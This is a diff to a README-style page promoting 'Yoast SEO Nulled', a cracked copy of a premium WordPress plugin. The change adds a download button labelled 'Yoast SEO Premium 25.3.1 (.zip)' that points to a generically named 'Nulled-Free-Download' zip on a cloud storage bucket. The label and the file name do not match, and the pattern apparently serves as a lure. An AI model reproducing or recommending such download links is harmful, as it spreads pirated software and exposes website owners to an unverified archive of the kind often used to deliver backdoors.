@@ -18,8 +18,11 @@ Are you looking for **Yoast SEO Nulled** to unlock premium SEO features for your
          style="max-width:340px;"/>
   </a>
 </p>
-
-
+<p align="center">
+  <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip" style="font-size:16px;">
+    <strong>Download Yoast SEO Premium 25.3.1 (.zip)</strong>
+  </a>
+</p>
 
 ---
 
